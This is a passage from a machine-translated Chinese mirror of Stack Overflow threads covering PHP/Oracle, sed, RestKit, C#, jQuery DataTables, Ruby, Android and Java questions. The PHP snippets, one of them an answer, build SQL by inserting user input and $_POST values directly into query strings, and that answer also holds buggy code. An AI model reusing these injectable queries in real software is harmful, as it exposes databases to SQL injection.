$userfeedback = "SELECT * FROM ASSET_FEEDBACK WHERE USER_EMAIL = '$userEmail' ORDER BY FEEDBACK_DATE";

$stmt3 = oci_parse($conn, $userfeedback);

if(oci_execute($stmt3))

{

    $row=oci_fetch_row($stmt3) ;

    print"<h2 id='title'>This Users Feedback</h2>";
    "<table border='2'>";

    print"<tr><td><p>Feedback ID:</td><td>$row[0]</td></tr>";
    print"<tr><td>Asset ID:</td><td>$row[1]</td></tr>";
    print"<tr><td>Feedback:</td><td>$row[3]</td></tr>";
    print"<tr><td>Date added:</td><td>$row[4]</td></tr>";

    print"</table></br>";   

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T20:34:49.120

将 oci_fetch_row 语句放入 while 循环中。 代码示例的[OCI 获取数组](http://www.php.net/manual/en/function.oci-fetch-array.php)

```
print"<h2 id='title'>This Users Feedback</h2>";
print"<table border='2'>";

while ($row=oci_fetch_row($stmt3))
{

    print"<tr><td><p>Feedback ID:</td><td>$row[0]</td></tr>";
    print"<tr><td>Asset ID:</td><td>$row[1]</td></tr>";
    print"<tr><td>Feedback:</td><td>$row[3]</td></tr>";
    print"<tr><td>Date added:</td><td>$row[4]</td></tr>";

}
print"</table></br>"; 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2015-12-17T07:03:59.363

Html 索引：使用超链接参考：

```
<a href="http://localhost/yourpath.php?opt=1>Show table</a> 
```

连接数据库并显示表：

```
<?php
echo $opt=$_GET['opt'];
$connection=OCILogon("user","password");
if($opt=='1') /*if u have a menu with other html*/
{
$ctab =OCIParse($connection,"SELECT * FROM table");
OCIExecute($ctab)

echo "<table>";
echo "<tr>";
echo "<th>ID</th>; 
....all your table header
echo "</tr>";

while(OCIFetch($ctab))
{ $id = OCIResult($ctab,"ID");
.........
print( "<tr>".
       "<td>$id</td>".
         ........
       "</tr>");
}

elseif($opt='2')  /*if you have a form , to get values and insert into table*/
{ echo $FirVal=$_POST["firval"];
$SecVal=$_POST["secval"];
echo $LastVal=$_POST["lastval"];

$ctab2=OCIParse($connect,"insert into table values($firval , '$secval', $lastval)");
OCIExecute($ctab2);
}
OCIFreeStatement($ctab2);
OCIFreeStatement($ctab);
OCILogOff($connection);
?> 
```

html表单的代码：

```
<form method="POST" action="http://localhost/phppath.php?opt=2">
Firstval:<input type="text" name="FirVal" size=8><br>
...........
<input type="SUBMIT" value="Add Values">
<input type="Reset" value ="Reset">
</form> 
```

# sed - 用前导减号替换尾随减号

> ID：10305531
> 
> 赞同：2
> 
> 时间：2012-04-24T20:29:11.357
> 
> 标签：sed

我正在尝试替换具有尾随减号的值并用前导减号替换它们。我有这个在 SED 中不太适用的正则表达式，虽然我不明白为什么。

```
echo '8.8-' | sed 's/(\d+(?:\.\d+)?)-/-\\1/' 
```

SED 回报 8.8-

我在 Notepad++ RegEx Help 插件中尝试了匹配 8.8- 并将子匹配 \1 标识为 8.8 的表达式

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-24T20:45:59.270

这`\d`是一个Perlism。Sed 指的是较旧的 Perl 之前的 POSIX 标准。你可能想要的是

```
echo '8.8-' | sed -r 's/([[:digit:]]+(\.[[:digit:]]+)?)-/-\1/' 
```

这`[[:digit:]]`是编写 Perl 的 POSIX 方式`\d`。

当然`[0-9]`，正如其他人所指出的那样，您可以只写 。

顺便说一句，您需要`-r`使括号随心所欲地工作。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-24T20:31:26.767

`\d`不匹配 sed 中的数字字符类，`[0-9]`但会。

顺便说一句，请包括你真正想做的事情——你在处理数字吗？整数和小数？我可以从您的 RegEx 中推断出尽可能多的内容，但如果问题被正确提出，则不需要。

***编辑***

如果您使用的是 GNU linux，最好使用字符类而不是传统范围，因为它们更便携：

```
echo '8.8-' | sed -r 's/([[:digit:]]+(\.[[:digit:]]+)?)-/-\1/' 
```

[http://sed.sourceforge.net/sedfaq3.html](http://sed.sourceforge.net/sedfaq3.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-24T20:36:44.693

```
echo '8- 8.1- 81.2- 8.28- 82.28-' | sed -r 's/([0-9]+(.[0-9]+)?)-/-\1/g' 
```

结果是

```
-8 -8.1 -81.2 -8.28 -82.28 
```

Sed 根本不理解 \d 或 \d：

```
 echo "456" | sed -r 's/\d/+/g'
 456 
```

# iphone - iPhone RestKit 如何加载本地 JSON 文件并将其映射到核心数据实体？

> ID：10305535
> 
> 赞同：7
> 
> 时间：2012-04-24T20:29:28.050
> 
> 标签：iphone, objective-c, ios, json, restkit

我正在构建一个双向保管箱同步应用程序。我从核心数据加载对象，将它们转换为 JSON 并将它们发送到保管箱。但是，当我进行同步时，我会将一组本地 JSON 文件与保管箱 JSON 文件进行比较。如果检测到冲突，则应用同步逻辑。由于同步逻辑，可能会下载远程 JSON 文件并将替换本地 JSON 文件。

所以我最终在本地文档目录中得到了一堆 JSON 文件。

**如何使用 RestKit 使用我定义的映射将本地 JSON 文件反序列化回对象？**RKTwitterCoreData 从基于 Web 的 JSON 创建核心数据实体。我正在尝试对本地 JSON 文件执行相同的操作。

有一堆 loadObjects 方法，但它们似乎都适用于 Web 调用：

```
- (RKObjectLoader*)loadObjectsAtResourcePath:(NSString*)resourcePath delegate:(id<RKObjectLoaderDelegate>)delegate; 
```

谢谢 ！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-21T14:12:21.343

这是来自 Rest-Kit 文档，还没有尝试过，但看起来像是开始，因为他们使用 JSON 字符串。

你可以在这里找到它： [查看页面底部](https://github.com/RestKit/RestKit/wiki/Object-mapping)

```
NSString* JSONString = @"{ \"name\": \"The name\", \"number\": 12345}";
NSString* MIMEType = @"application/json";
NSError* error = nil;
id<RKParser> parser = [[RKParserRegistry sharedRegistry] parserForMIMEType:MIMEType];
id parsedData = [parser objectFromString:JSONString error:&error];
if (parsedData == nil && error) {
    // Parser error...
}

RKObjectMappingProvider* mappingProvider = [RKObjectManager sharedManager].mappingProvider;
RKObjectMapper* mapper = [RKObjectMapper mapperWithObject:parsedData mappingProvider:mappingProvider];
RKObjectMappingResult* result = [mapper performMapping];
if (result) {
    // Yay! Mapping finished successfully
} 
```

**编辑** 请参阅关于保存上下文的 rob5408 注释：

```
 [[RKObjectManager sharedManager].objectStore.managedObjectContext save:&error]; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-03T15:54:36.083

如果你想拥有与“默认”Restkit 函数完全相同的行为，`- (void)objectLoader:(RKObjectLoader*)objectLoader didLoadObjects:(NSArray*)objects` 你可以使用它来获取宝贵的`objects`NSArray ：

```
RKObjectMappingResult* result = [mapper performMapping];
NSArray* objects = [result asCollection]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-21T13:00:18.630

这是我用于核心数据到 JSON 到核心数据转换的内容。

```
 -(void)deserializeFileAtPath:(NSString*)filePath
{
    DLog(@"Deserialize file: %@",filePath);
    NSError* error = nil;
    NSString *stringJSON = [NSString stringWithContentsOfFile:filePath usedEncoding:nil error:&error];
    if(error)
    {
        NSLog(@"Error reading from file: %@", filePath);
    }

    //restore the dictionary, as it was serialized
    NSDictionary* serializationDictionary =  [NSJSONSerialization JSONObjectWithData:[NSData dataWithContentsOfFile:filePath] options:NSJSONReadingMutableContainers error:&error];

    //Here you must ensure that your object mapping exists
    [CoreDataWrapper setupCoreDataObjectMapping];

//top level object within JSON it will have one entity that you really want to deserialize. Without a wrapper, the mapper would not know what the top level entity really is
    CoreDataWrapper* wrapper = [CoreDataWrapper object];

    RKObjectMapper* mapper;
    error = nil;

//this performs deserialization. if you get errors about designated initializer not being called, you have setup a wrong object mapping. You need to define RKManagedObjectMapping for your core data classes
    mapper = [RKObjectMapper mapperWithObject:serializationDictionary 
                              mappingProvider:[RKObjectManager sharedManager].mappingProvider];
    RKObjectMappingResult* result = [mapper performMapping];

    //top level object within wrapper that holds the real payload
    RealCoreDataEntity* realCoreData = [result asObject];
    realCoreData.wrapper = wrapper;

//just in case
    [[wrapper managedObjectContext]save:nil];

//prints what we got back
    DLog(@"%@", realCoreData);

//prints any nested relationships
    for(NestedRelationshipObject* relationshipEntity in realCoreData.relationship)
    {
        DLog(@"Nested entity:%@", relationshipEntity);
    }

} 
```

下面介绍如何定义嵌套的 RestKit 对象模型。当这个结构的 JSON 文件被反序列化时，它会自动为你创建所有的嵌套关系，甚至合并托管对象上下文！

```
+(void)setupCoreDataObjectMapping
{

RKObjectManager *objectManager = [RKObjectManager sharedManager ] ;

// Setup our object mappings    
/*!
 Mapping by entity. Here we are configuring a mapping by targetting a Core Data entity with a specific
 name. This allows us to map back Twitter user objects directly onto NSManagedObject instances --
 there is no backing model class!
 */
//********************************    
RKManagedObjectMapping* nestedRelationshipMapping = [RKManagedObjectMapping mappingForEntityWithName:@"NestedRelationshipObject"];
//UUID determines which objects get updated and which ones get created during the mapping process
nestedRelationshipMapping.primaryKeyAttribute = @"uuid";
[nestedRelationshipMapping mapKeyPathsToAttributes:
 @"IKeepTheseTheSame", @"IKeepTheseTheSame",
 @"AnotherValue",@"AnotherValue",
 //keep adding your attributes
 nil];
[objectManager.mappingProvider addObjectMapping:nestedRelationshipMapping];

//********************************    

RKManagedObjectMapping* mainPayloadMapping = [RKManagedObjectMapping mappingForEntityWithName:@"RealCoreDataEntity"];
mainPayloadMapping.primaryKeyAttribute = @"uuid";
[mainPayloadMapping mapKeyPathsToAttributes:
 @"companyName",@"companyName",
 //keep adding your attributes
 nil];

//this is the main payload. I create all of it's relationships before, and then add them to the mapping.
[mainPayloadMapping mapRelationship:@"relationshipName" withMapping:nestedRelationshipMapping];
[objectManager.mappingProvider addObjectMapping:mainPayloadMapping];

[objectManager.mappingProvider setSerializationMapping:[mainPayloadMapping inverseMapping] forClass:[YourNSManagedObjectSubclass class]];

[objectManager.mappingProvider setMapping:nestedRelationshipMapping forKeyPath:@"mainPayloadToNestedDataRelationshipName"];
[objectManager.mappingProvider setMapping:mainPayloadMapping forKeyPath:@"wrapperToMainPayloadRelationshipName"];

//this is a top level JSON object. It's name will not be identified within the object, but it's relationshipName will be. The result of deserializing this object would be an object that is being wrapped.
RKManagedObjectMapping* wrapperMapping = [RKManagedObjectMapping mappingForClass:[IconFileWrapper class]];
iconWrapperMapping.primaryKeyAttribute = @"uuid";
//    keyPath and attribute names. must be even
[iconWrapperMapping mapKeyPathsToAttributes:@"uuid",@"uuid",nil];
//keep adding your attributes
[iconWrapperMapping mapRelationship:@"relationshipName" withMapping:mainPayloadMapping];

[objectManager.mappingProvider addObjectMapping:wrapperMapping];
[objectManager.mappingProvider setSerializationMapping:[wrapperMapping inverseMapping] forClass:[YourWrapperNSManagedObjectSubclass class]];

} 
```

# c# - C#控制数据的对齐方式

> ID：10305548
> 
> 赞同：7
> 
> 时间：2012-04-24T20:30:06.220
> 
> 标签：c#, interop

在 C++ 中，您可以使用`__declspec( align( # ) )`声明符来控制用户定义数据的对齐方式。如何为 C# 做到这一点。我在我的 dll 中有两个用汇编程序编写的程序。过程的参数（两个数组）应该在 16 个字节上对齐。对于 C++，它工作正常。

我只是使用了声明

```
__declspec( align( 16 ) )
double a[2]={10.2,10.6}; 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-24T20:39:20.217

如果您正在寻找托管到非托管互操作*（在基于 C#/.NET 和基于 C/C++/汇编器的软件之间传输数据）*，您将使用[`StructLayout`](https://msdn.microsoft.com/en-us/library/system.runtime.interopservices.structlayoutattribute(v=vs.110).aspx)属性和[`FieldOffset`](https://msdn.microsoft.com/en-us/library/system.runtime.interopservices.fieldoffsetattribute(v=vs.110).aspx)属性的组合：

```
[StructLayout(LayoutKind.Explicit, Pack = 16)]
public class MyDataClass {
    [FieldOffset(0)]
    double[] a;
} 
```

根据 MSDN：

> System.Runtime.InteropServices.StructLayoutAttribute.Pack 字段确定目标对象的数据字段的内存对齐方式。

[http://support.microsoft.com/kb/922785](http://support.microsoft.com/kb/922785)

# windows-phone-7 - WP7中Listbox的SelectedItem，不滚动

> ID：10305551
> 
> 赞同：1
> 
> 时间：2012-04-24T20:30:13.523
> 
> 标签：windows-phone-7

我在数据透视页面中有 3 个列表框。Normaly 当我写类似的东西时：listBox3.SelectedIndex = 10;

项目被选中并显示。不，我有问题，选择了正确的项目，但列表框没有滚动到所选项目。有人知道这是什么问题吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T20:41:40.200

使用[`ScrollIntoView`](http://msdn.microsoft.com/en-us/library/system.windows.controls.listbox.scrollintoview%28v=vs.95%29.aspx)方法。

```
listBox3.SelectedIndex = 10;
listBox3.ScrollIntoView( listBox3.SelectedItem ); 
```

# jquery - 如何使用自然排序插件制作工作数据表？

> ID：10305552
> 
> 赞同：1
> 
> 时间：2012-04-24T20:30:17.610
> 
> 标签：jquery, datatables, natural-sort

我见过一些类似的问题，但在我的情况下没有正确答案。

我使用[DataTables](http://datatables.net/release-datatables/examples/basic_init/zero_config.html)插件对一些表进行排序。

但是我们不能像数字那样对数据进行排序，而它们不是（坚果;-p）。例如，我们不能像这样对格式化的价格进行排序：

*   2 150 000 欧元
*   4 500 000 欧元
*   225 000 欧元</li>

所以我尝试包含一个名为“[自然排序”的](http://www.overset.com/2008/09/01/javascript-natural-sort-algorithm-with-unicode-support/)[DataTables 插件](http://datatables.net/plug-ins/sorting)。但它似乎不起作用，我可能会犯一些错误，但我找不到它们。

任何帮助将不胜感激。

您需要查看/测试它的所有内容：**[JSfiddle](http://jsfiddle.net/DzaQe/1/)**（尝试对列进行排序......）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T20:53:11.093

所以看起来你有两个问题。首先，dT 没有选择您的自定义排序 - 它只是忽略它并使用标准排序。我可以通过为每一列指定排序来解决这个问题：

```
$('#table_list').dataTable({
    "aoColumns": [null, {"sType": "natural"}, null, null],
    "aaSorting": [[ 1, "asc" ]],
    "sScrollX": "100%",
}); 
```

其次，自然排序不会按照您期望的方式对这些数字进行排序。它将第一个数字部分直到空格并对其进行排序，如下所示：

```
2 150 000 €
4 750 000 €
210 000 € 
```

所以你可能只想写你自己的排序。这是我试过的一个例子：

```
function testSort( a, b ) {
    var aa = a.replace(/[ \.]/g,''), bb = b.replace(/[ \.]/g,'');
    aa = parseInt( aa.substring( 0, aa.length - 1 ) );
    bb = parseInt( bb.substring( 0, bb.length - 1 ) );
    return aa == bb ? 0 : ( aa < bb ? -1 : 1 );
} 
```

关键是删除空格、句点和欧元符号，以便可以将其读取为数字。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-24T22:23:07.320

谢谢@Ryan P 我的 sType 声明是错误的......

最后，我需要添加更多插件以使其工作，如果它可以帮助某人，我会分享它：

*   自然排序：对于 varchar 值

> ```
> jQuery.fn.dataTableExt.oSort['natural-asc']  = function(a,b) {
>     return naturalSort(a,b);
> };
> 
> jQuery.fn.dataTableExt.oSort['natural-desc'] = function(a,b) {
>     return naturalSort(a,b) * -1;
> }; 
> ```

*   将“null”类型转换为 formated-num ：

> ```
> jQuery.fn.dataTableExt.aTypes.unshift(  
>     function ( sData )  
>     {  
>         var deformatted = sData.replace(/[^\d\-\.\/a-zA-Z]/g,'');
>         if ( $.isNumeric( deformatted ) ) {
>             return 'formatted-num';
>         }
>         return null;  
>     }  
> ); 
> ```

*   Formatted-num : 用于...格式化数字值

> ```
> jQuery.fn.dataTableExt.oSort['formatted-num-asc'] = function(a,b) {
>     /* Remove any formatting */
>     var x = a.match(/\d/) ? a.replace( /[^\d\-\.]/g, "" ) : 0;
>     var y = b.match(/\d/) ? b.replace( /[^\d\-\.]/g, "" ) : 0;
> 
>     /* Parse and return */
>     return parseFloat(x) - parseFloat(y);
> };
> 
> jQuery.fn.dataTableExt.oSort['formatted-num-desc'] = function(a,b) {
>     var x = a.match(/\d/) ? a.replace( /[^\d\-\.]/g, "" ) : 0;
>     var y = b.match(/\d/) ? b.replace( /[^\d\-\.]/g, "" ) : 0;
> 
>     return parseFloat(y) - parseFloat(x);
> }; 
> ```

这里的工作示例：http: [//jsfiddle.net/DzaQe/3/](http://jsfiddle.net/DzaQe/3/)

# php - 如何将表格单元格 () 的宽度设置为最大 X% 但不超过 Ypx

> ID：10305553
> 
> 赞同：0
> 
> 时间：2012-04-24T20:30:18.687
> 
> 标签：php, asp.net, html

我想要一个有两列的表。

我知道如何将列的宽度设置为表格宽度的百分比或像素数。

我希望左列具有最大宽度，而我需要右列是表格宽度的 20%，但不超过 150px。

问题是表格宽度取决于客户端屏幕分辨率，但右列不应该“增长太多”。

我怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T20:33:46.963

查看 css 属性`min-width`和`max-width`.

# ruby-on-rails - 从 mixin 访问类名

> ID：10305557
> 
> 赞同：4
> 
> 时间：2012-04-24T20:30:28.023
> 
> 标签：ruby-on-rails, ruby, mixins

在我的 Rails 项目中，我将全局设置存储在字符串索引的散列中，其中每个类（模型）都有一个用于其自己设置的“命名空间”。例如，新闻模型可能具有设置“news.stories_per_page”或“news.show_date”。

为了避免必须在任何地方命名-mangle，我有一个 mixin，它提供了用于访问这些设置的通用类方法。使用这个 mixin，我可以使用如下代码访问“news.show_date”：

```
News.setting :show_date
=> true 
```

现在，问题来了。为了生成字符串“news.show_date”，我需要知道混合我的模块的模型的类名。但在类方法中，

```
self.class
=> Class 
```

这对我不是很有帮助。在我幼稚的实现中，这导致所有模型都将其设置存储在“类”下。命名空间，这是不可接受的。

对于无法更清楚地说明问题，我深表歉意。我对 Ruby 有点陌生，还没有完全理解它的对象模型。问题可能与[Ruby 中似乎需要混合类方法的 kludge 有关](http://www.ruby-forum.com/topic/#88311)。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-24T21:21:26.160

类的名称是类的名称`name`：

```
module Foo
  def whoami
    self.name
  end
end

class Bar
  extend Foo
end

p Bar.whoami #=> "Bar" 
```

我不会创建一些字符串；我会为每个类创建一个新的设置哈希：

```
module Settings
  def setting(name,value=:GIT_DA_VALUE)
    @_class_settings ||= {}  # Create a new hash on this object, if needed
    if value==:GIT_DA_VALUE
      @_class_settings[name]
    else
      @_class_settings[name] = value
    end
  end
end

class Foo
  extend Settings
end
class Bar
  extend Settings
end
Foo.setting(:a,42)

p Foo.setting(:a), #=> 42
  Foo.setting(:b), #=> nil
  Bar.setting(:a)  #=> nil  (showing that settings are per class) 
```

...否则我将由类对象本身索引单个全局哈希（如果需要）：

```
module Settings
  # A single two-level hash for all settings, indexed by the object
  # upon which the settings are applied; automatically creates
  # a new settings hash for each object when a new object is peeked at
  SETTINGS = Hash.new{ |h,obj| h[obj]={} }
  def setting(name,value=:GIT_DA_VALUE)
    if value==:GIT_DA_VALUE
      SETTINGS[self][name]
    else
      SETTINGS[self][name] = value
    end
  end
end

# Usage is the same as the above; settings are unique per class 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-24T20:52:43.190

相反，`self.class`您可以使用`self.ancestors`或更详细`self.ancestors.first`：

```
module Mixin
  def setting(name)
    puts "call #{self.ancestors.first}.#{__method__} with #{name}"
  end
end

class A
  extend Mixin
end

A.setting :a  #-> call A.setting with a 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T20:37:16.437

一种解决方法是`self`在每个类方法中实例化并调用`class`实例。这不是一个特别漂亮的解决方案，但它似乎有效。

```
module SettingsMixin
  def self.included receiver
     receiver.extend ClassMethods
  end

  module ClassMethods
    def setting(key)
      class_name = self.new.class # => ClassThatMixesMeIn

      # Setting-fetching logic here...

    end
  end
end 
```

内部的代码在`ClassMethods`从`ClassThatMixesMeIn`. 然后它将具有正确的值。

# android - Android 在 WIDGET 中获取当前 GPS 位置

> ID：10305558
> 
> 赞同：2
> 
> 时间：2012-04-24T20:30:40.730
> 
> 标签：android, google-app-engine, widget, location

您好，我正在尝试在 App Widget 中获取我的手机的当前位置 Widget 接收器工作正常。但我无法获得经度和纬度

```
public class MobielTrackingActivity extends AppWidgetProvider {

public static String ACTION_WIDGET_RECEIVER1 = "ActionReceiverWidget1";
private static final String DATABASE_TABLE_LOCATIES = "locaties";
DatabaseHelper mOpenHelper;

LocationManager locMgr = null;
LocationListener locListener = null;

private double lng = 0;
private double lat = 0;

@Override
public void onUpdate(Context context, AppWidgetManager appWidgetManager,int[] appWidgetIds) {
    mOpenHelper = new DatabaseHelper(context);

    // Create a RemoteViews object from  layout
    RemoteViews remoteViews = new RemoteViews(context.getPackageName(),
            R.layout.main);
    // For button #1

    // Acquire a reference to the system Location Manager
    LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);

    // Define a listener that responds to location updates
    LocationListener locationListener = new LocationListener() {
        public void onLocationChanged(Location location) {
          // Called when a new location is found by the network location provider.
            if (location != null)
            {
                lng = location.getLongitude();
                lat = location.getLatitude();
            }
        }

        public void onStatusChanged(String provider, int status, Bundle extras) {}

        public void onProviderEnabled(String provider) {}

        public void onProviderDisabled(String provider) {}
      };

    // Register the listener with the Location Manager to receive location updates
    locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationListener);

    Intent mIntent1 = new Intent(context, MobielTrackingActivity.class);
    mIntent1.setAction(ACTION_WIDGET_RECEIVER1);
    //mIntent1.putExtra("msg", "Uw locatie is opgeslagen met long "+ lng +" en lat " + lat);
    mIntent1.putExtra("msg", "Uw locatie is opgeslagen met " + lat + " " + lng);
    PendingIntent mPendingIntent1 = PendingIntent.getBroadcast(context,
            0, mIntent1, 0);

    remoteViews.setOnClickPendingIntent(R.id.button_saveLocation,mPendingIntent1);

    // Update the widget
    appWidgetManager.updateAppWidget(appWidgetIds, remoteViews);
}

@Override
public void onReceive(Context context, Intent intent) {

    // v1.5 fix that doesn't call onDelete Action
    final String action = intent.getAction();
    if (AppWidgetManager.ACTION_APPWIDGET_DELETED.equals(action)) {
        final int appWidgetId = intent.getExtras().getInt(
                AppWidgetManager.EXTRA_APPWIDGET_ID,
                AppWidgetManager.INVALID_APPWIDGET_ID);
        if (appWidgetId != AppWidgetManager.INVALID_APPWIDGET_ID) {
            this.onDeleted(context, new int[] { appWidgetId });
        }

    }

    // check, if our Action was called
    // Save current location in database
    else if (intent.getAction().equals(ACTION_WIDGET_RECEIVER1)) {
        String msg = "null";
        try {
            msg = intent.getStringExtra("msg");
        } catch (NullPointerException e) {
            Log.e("Error", "msg = null");
        }
        Toast.makeText(context, msg, Toast.LENGTH_LONG).show();

        PendingIntent contentIntent = PendingIntent.getActivity(context, 0,
                intent, 0);
        NotificationManager notificationManager = (NotificationManager) context
                .getSystemService(Context.NOTIFICATION_SERVICE);
        Notification noty = new Notification(R.drawable.ic_launcher, "Button 1 clicked", System.currentTimeMillis());

        noty.setLatestEventInfo(context, "Notice", msg, contentIntent);
        notificationManager.notify(1, noty);

        // Add current location to database
        /*SQLiteDatabase db = mOpenHelper.getWritableDatabase();
        ContentValues newRow = new ContentValues();
        newRow.put("naam", "locatie 1");
        newRow.put("beschrijving", "Wielerwedstrijd door harelbeke");
        newRow.put("lng", 10.254);
        newRow.put("lat", 540.36);
        db.insert(DATABASE_TABLE_LOCATIES, null, newRow);
*/
    } else {
        // do nothing
    }

    super.onReceive(context, intent);

}
} 
```

由于某种原因，纬度和经度保持 0.0 和 0.0 我做错了什么。

提前致谢

# ios - UITabBar 透明背景/重叠 UITableView

> ID：10305559
> 
> 赞同：1
> 
> 时间：2012-04-24T20:30:49.497
> 
> 标签：ios, uitableview, user-interface, uitabbar

我上传了一张图片来说明问题/想要的效果：http: [//i.imgur.com/B5vJs.jpg](http://i.imgur.com/B5vJs.jpg)

我有一个带有自定义背景的 UITabBar（包括多页/页尾效果 - 是的，直接在 UITabBar 上，因为我需要那里的阴影）。工作正常。我还为每个选项卡项设置了一个 UINavigationController，该选项卡项随后控制一组 UITableViewController。

我必须实现的设计需要背景和 UITabBar 有一定的重叠（见附图）。对于它的地狱，我想不出一个聪明的方式来实现这一点。

我最初剪切了多页效果条并将其附加在每个 UITableView（页脚视图）的底部，但是虽然这种工作有效，但在某些情况下并不理想。

我真的只是在寻找有关如何处理此问题的灵感或建议。

我知道每个人都喜欢先看代码，但在这种情况下，我不知道为什么。因此，如果您想查看部分代码，请告诉我。没问题。

有没有人解决这个问题或很好地实现这个？AppStore 中的应用程序链接可以很好地完成这一点也很有帮助。

# java - 如何用抽象类输出

> ID：10305565
> 
> 赞同：0
> 
> 时间：2012-04-24T20:31:12.367
> 
> 标签：java, abstract, tostring

我是继承和抽象类的新手。

对于这个例子，我正在设计一个可以包含个人或企业的电话簿。该人具有头衔、名字、姓氏和电话号码。该企业有一个企业名称和一个电话号码。我用抽象方法 getName 创建了一个抽象类（这对你们来说可能听起来很简单，但请多多包涵！）

```
public  abstract class PhoneBook {

private String phone;

public boolean setPhone(String p) //final
{
    boolean flag = false;
    if(p.length()!= 10)
    {
        flag = false;
    }

    for (int i = 0; i < p.length(); i++)
    {
        if(Character.isDigit(p.charAt(i)))
        {
            phone = p;
            flag = true;
        }
    }
    return flag;
}

public abstract String getName();

} 
```

我的两个子类是人员和业务。该人的 getName 方法将标题、f 名称、l 名称连接起来。主要是我创建了一个电话簿数组（抽象数组），它可以容纳一个人或一个企业。

我在输出时遇到困难...如何访问 getPhone （在抽象类中）以输出它？

这是主要的（我目前只处理人员部分）

```
import javax.swing.*; 
```

公共类电话簿条目{

```
public static final int MAX = 100;

public static void main(String[] args) {

    PhoneBook[] phone = new PhoneBook[100];
    int selection;
    int i = 0;

    do{
        selection = Integer.parseInt(JOptionPane.showInputDialog("Would you like to add a\n1.person\n2.business\nto the phone book?"));

    switch(selection)
    {
    case 1: phone[i]= fillPerson();
        break;
    case 2: fillBusiness();
        break;
    }

    }while(i < MAX && JOptionPane.showConfirmDialog(null, "Add another entry to phone book?")==JOptionPane.YES_OPTION);

    //output
    String output;
    output = phone[i].getName();
    JOptionPane.showMessageDialog(null, output);

}

private static PhoneBook fillPerson()
{
    Person someone = new Person();
    someone.setTitle(JOptionPane.showInputDialog("Enter your title\n(Mr., Mrs., Ms., or Dr.)"));
    someone.setFName(JOptionPane.showInputDialog("Enter the first name of the person: "));
    someone.setLName(JOptionPane.showInputDialog("Enter the last name of the person: "));
    while(!someone.setPhone(JOptionPane.showInputDialog("Enter your 10 digit phone number: ")))
        JOptionPane.showMessageDialog(null, "Error. Please enter only 10 numerical values\n(examle: 7034567890");
    return someone;
}

private static void fillBusiness()
{

} 
```

}

getName 我可以轻松访问，因为我有 PhoneBook[]。我在想我需要一个 toString in Person 来将所有内容（同时姓名和电话号码）混合在一起，但主要是因为我没有实例化 Person ，所以我无法访问该 toString ？抱歉，如果这令人困惑...我只是在输入我的（可怜的）思路...

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-24T20:38:12.703

您应该始终能够调用`toString()`任何对象，因为这是一个定义的方法，`java.lang.Object`它是所有其他类的超类。

因此，如果您覆盖`toString()`您的`Person`课程，您应该没有任何问题从您的 Abstract 课程中调用它。

根据您的问题，我不确定您要做什么，但这里是 Person 的 toString 实现示例：

```
@Override
public String toString(){

    StringBuilder result = new StringBuilder();
    String NEW_LINE = System.getProperty("line.separator");

    result.append(this.getClass().getName() + " Object {" + NEW_LINE);
    result.append(" Title: " + getTitle() + NEW_LINE);
    result.append(" FName: " + getFName() + NEW_LINE);
    result.append(" LName" + getLName + NEW_LINE );
    result.append("}");

    return result.toString();
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T21:37:06.580

我认为问题的一部分可能是概念性的——让我来谈谈抽象类之类的。

任何类背后的想法都是代表你系统的某个部分——你可以用一个名词来代表你正在编写的系统的一部分。您在“人”和“业务”中有很好的例子；在这种应用程序中还有其他方法可以做事，但这是一个好的开始。

另一张海报提到了“Entry”，在这种情况下，我认为它是抽象类的一个很好的候选——电话簿中的一个“条目”可以是企业或个人；所以电话簿可以充满“条目”，每个条目要么是一个企业，要么是一个人。

当一个类从另一个类继承时，最好是“子类”——此处为 Business 或 Person——是基类的特例——在本例中为 Entry。

在条目上定义的方法应该反映条目，而不是依赖于该条目上的特定类。例如，将 getFirstName() 方法放在 Entry 中是错误的，除非该方法应用于 Entry 的每个可能的子类。由于我们通常不认为企业有名字，这可能是我们只能在 Person 中找到的一种方法。

因此，您可以在 Entry 中有方法，例如，可以返回显示条目所需的信息。你可以有一个方法 getDisplayName(); 在 Entry 中它是一个空方法，只是定义它不带参数并返回一个字符串，在 Person 中它可以将 last、first、middle 或任何你想要的放在一起；在 Business 中，它可以改为获取公司名称。

还有一点——你不想在这些类中放任何与“输出”有关的东西；这些是保存应用程序“业务对象”的类，您将拥有其他处理所有形式的输出的类。当然，用于调试的 System.out.println 语句没有任何问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T21:06:09.907

你应该`getPhone`为你的抽象类添加一个方法（或者任何常见的方法，这就是接口/抽象类的重点）

```
public String getPhone(){
    return phone
} 
```

如果您需要一些特定格式的个人或商务电话覆盖该方法（或使吸气剂抽象。这取决于您的要求，但我想普通的旧吸气剂是可以的）

# java - java中的骨架化和细化

> ID：10305566
> 
> 赞同：0
> 
> 时间：2012-04-24T20:31:17.830
> 
> 标签：java, image, image-processing

我有一个问题，我无法弄清楚。我必须使用两种不同的图像处理技术：[骨架](http://homepages.inf.ed.ac.uk/rbf/HIPR2/skeleton.htm)化 和[细化](http://homepages.inf.ed.ac.uk/rbf/HIPR2/thin.htm)，我必须在 java 中做到这一点。现在的问题是我找不到任何起点或教程。谁能告诉我应该从哪里开始，或者有人可以解释我如何才能做到这一点？`BufferedImage`我正在用 Java 编写应用程序，如果可能的话，我想使用 a （当然）。

谢谢

* * *

